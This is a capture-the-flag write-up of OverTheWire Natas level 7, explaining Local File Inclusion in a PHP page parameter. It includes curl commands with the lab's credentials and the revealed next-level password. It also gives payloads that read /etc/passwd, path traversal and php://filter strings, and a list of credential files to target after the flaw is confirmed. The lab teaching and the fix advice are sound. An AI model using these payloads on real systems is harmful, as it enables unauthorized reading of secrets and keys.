---
title: "OverTheWire Natas Level 7 → 8: Local File Inclusion (LFI)"
description: "Natas Level 7's page parameter loads files from the server filesystem without sanitisation. A hint in the HTML tells us exactly where the password lives."
date: 2026-06-09
platform: OverTheWire
difficulty: easy
tags: [ctf, web, natas, overthewire, lfi, local-file-inclusion, path-traversal]
series: "OverTheWire Natas"
order: 7
seriesLabel: "Level 7 → 8"
draft: false
---

> Part of a complete level-by-level Natas series. Each post is self-contained — if you want context on the setup and tooling, start with the [Intro & Setup](../natas-00-introduction/) post.

## Introduction

Level 7 is where the difficulty meaningfully jumps. This is **Local File Inclusion** — one of the most impactful vulnerability classes in PHP web applications, and one that still appears in real production code. The page has two navigation links: `Home` and `About`. The URL for each one looks like `index.php?page=home` and `index.php?page=about`. That `page` parameter is being passed directly to PHP's include or file-read function without any sanitisation. The HTML source helpfully tells us where the natas8 password lives on the filesystem. We point the `page` parameter there instead.

## Official Challenge Objective

> **[Navigation links for Home and About]** *(the page parameter controls which file is displayed)*

## Skills Covered

- Identifying LFI-vulnerable URL parameters
- Exploiting PHP file inclusion to read arbitrary server files
- Understanding the `/etc/natas_webpass/` password storage convention
- URL encoding and parameter injection in GET requests
- Reading between the lines of hint comments in HTML

## My Approach

I looked at the two navigation links and noticed the `?page=` parameter pattern immediately — that is an LFI red flag. Then I checked the page source, where the hint comment told me exactly which file to read. I replaced `page=home` with `page=/etc/natas_webpass/natas8` and the password was rendered in the page content. The exploit was one URL change.

## Step-by-Step Walkthrough

### Command

```bash
curl http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org/
```

### Explanation

The page HTML reveals the navigation structure and the key hint:

```html
<html>
<head>
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
</head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

</div>
</body>
</html>
```

Two things stand out:
1. The `page` parameter in both links takes a filename-like value (`home`, `about`).
2. The HTML comment tells us the exact path of the natas8 password file: `/etc/natas_webpass/natas8`.

The comment is the level's hint mechanism — but in the real world, a comment like this would be a catastrophic information disclosure that directly enables the LFI attack.

### Why It Matters

The `?page=home` pattern is a classic LFI indicator. When a PHP application builds a filepath from a URL parameter and passes it to `include()`, `require()`, `file_get_contents()`, or `readfile()`, any path the web server user can read becomes attackable. The application intends `page=home` to load `home.php` or `home.html`, but nothing stops an attacker from trying `page=/etc/passwd` or `page=../config/database.php`.

---

### Command

```bash
curl "http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
```

### Explanation

Replacing `page=home` with `page=/etc/natas_webpass/natas8` instructs the PHP backend to include (or read) the password file instead of the intended page. The server's response embeds the file contents directly in the page HTML:

```html
<html>
<head>
...
</head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

</div>
</body>
</html>
```

The natas8 password is `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`, printed in the page body where the "page" content would normally appear.

### Why It Matters

The application is literally serving the contents of `/etc/natas_webpass/natas8` as a web page. There is no exploit beyond a single URL parameter change. This is the defining characteristic of LFI: user-controlled input directly controls what file the server reads and returns.

---

### Command

```bash
# Verify by also reading /etc/passwd as a classic LFI test
curl "http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd"
```

### Explanation

On a real pentest, reading `/etc/passwd` is the standard LFI proof-of-concept — it is always readable by all users and its contents are recognisable. If you see `/etc/passwd` content (a list of `username:x:uid:gid:...:/home/...:/bin/...` lines) in a web page response, you have confirmed LFI. From there, you expand to reading application configuration files, log files, SSH private keys, or any other file the web server process can read.

### Why It Matters

LFI confirmation and impact assessment go together. Once you confirm the vulnerability, you need to determine the "blast radius" — what sensitive files are readable? On Natas, the web server runs as a user that can read all the `/etc/natas_webpass/` files, so the impact is direct. On a real application, the impact depends on the web server user's permissions.

## Deep Dive: Cyber Security Concept

**Local File Inclusion (LFI) — when the server reads files on your behalf.**

LFI occurs when a PHP application (or similar server-side language) takes user input and uses it as part of a file path without proper validation or sanitisation. The vulnerable PHP might look like:

```php
// Vulnerable: $page comes directly from user input
$page = $_GET['page'];
include($page . '.php');

// Or more directly:
echo file_get_contents($_GET['page']);
```

The impact of LFI ranges from reading sensitive files (as here) to full Remote Code Execution (RCE) via log poisoning, PHP session file injection, or PHP wrappers (`php://filter`, `php://input`). Even "simple" LFI that only allows reading files is High severity in real assessments because it typically leads to:

- Reading application configuration files (database passwords, API keys)
- Reading `/etc/passwd` and `/etc/shadow` (for offline cracking if shadow is readable)
- Reading SSH private keys (`/home/user/.ssh/id_rsa`)
- Reading PHP session files or cookies to hijack other users' sessions
- Reading web server log files (which can be poisoned for RCE)

The `/etc/natas_webpass/` path used throughout Natas is a realistic model: in real systems, applications often store secrets in predictable filesystem locations that an LFI attacker can read once they know the convention.

> [!IMPORTANT]
> Never pass user-controlled input directly to file-reading functions (`include`, `require`, `file_get_contents`, `readfile`, `fopen`). Use an allowlist of known-valid values, resolve the path and confirm it stays within the intended directory, and never concatenate raw user input into a file path.

## Offensive Security Perspective

LFI is one of the most commonly tested vulnerability classes in web pentesting. The identification methodology:

1. Look for URL parameters that look like file names or paths: `?page=`, `?file=`, `?include=`, `?template=`, `?view=`, `?doc=`.
2. Try absolute paths: `?page=/etc/passwd`.
3. Try relative paths with traversal: `?page=../../etc/passwd` (if the application appends an extension, this can bypass that).
4. Try PHP wrappers: `?page=php://filter/convert.base64-encode/resource=index.php` (reads PHP source code without executing it).
5. Try log poisoning if you have write access to log files.

Tools like `ffuf` and `wfuzz` automate LFI payload testing against a wordlist. But the manual approach — spotting the pattern and testing a handful of payloads — is often faster and catches edge cases the tools miss.

## Common Beginner Mistakes

- Not noticing the `?page=` parameter pattern and treating the links as plain navigation.
- Missing the HTML comment that gives the exact file path hint.
- Trying path traversal (`../../etc/passwd`) when a direct absolute path (`/etc/natas_webpass/natas8`) already works.
- URL-encoding the forward slashes unnecessarily — most web servers handle raw `/` in query parameters.
- Not confirming LFI with `/etc/passwd` before trying the specific target file.

## Key Takeaways

- Parameters that look like filenames (`page=home`, `file=report`, `template=main`) are LFI candidates — test them first.
- Direct absolute paths like `/etc/natas_webpass/natas8` work in LFI when there is no path sanitisation.
- `/etc/passwd` is the standard LFI proof-of-concept because it is universally readable and its contents are recognisable.
- The Natas password file convention (`/etc/natas_webpass/natasX`) mirrors how real applications store secrets in predictable filesystem locations.
- LFI is a High/Critical vulnerability even when it is "read-only" because configuration files, SSH keys, and credential stores are typically filesystem-readable.

## How This Helps Build Cyber Security Expertise

- **LFI identification and exploitation:** recognising the parameter pattern and testing payloads systematically is a core web pentesting skill used on every engagement.
- **Post-LFI pivot:** understanding what files to read after confirming LFI (config files, SSH keys, session files) is part of thinking like an attacker.
- **PHP security:** knowing how `include()` and `file_get_contents()` become attack vectors teaches secure PHP development practices.
- **OWASP alignment:** LFI falls under A01:2021 Broken Access Control and A03:2021 Injection, making it a high-priority test case.

## Additional Reading

- [OWASP — Local File Inclusion (Testing Guide)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PortSwigger — File path traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — LFI wordlist and techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [CWE-98 — Improper Control of Filename for Include/Require Statement in PHP Program](https://cwe.mitre.org/data/definitions/98.html)

---

## Connect with the Author

Written by **Himangshu Pan** — cybersecurity researcher.

- **GitHub:** [@0xSh3ru](https://github.com/0xSh3ru)
- **LinkedIn:** [in/0xsh3ru](https://www.linkedin.com/in/0xsh3ru/)

*If this walkthrough helped, follow along on GitHub and connect on LinkedIn — questions and corrections are always welcome.*
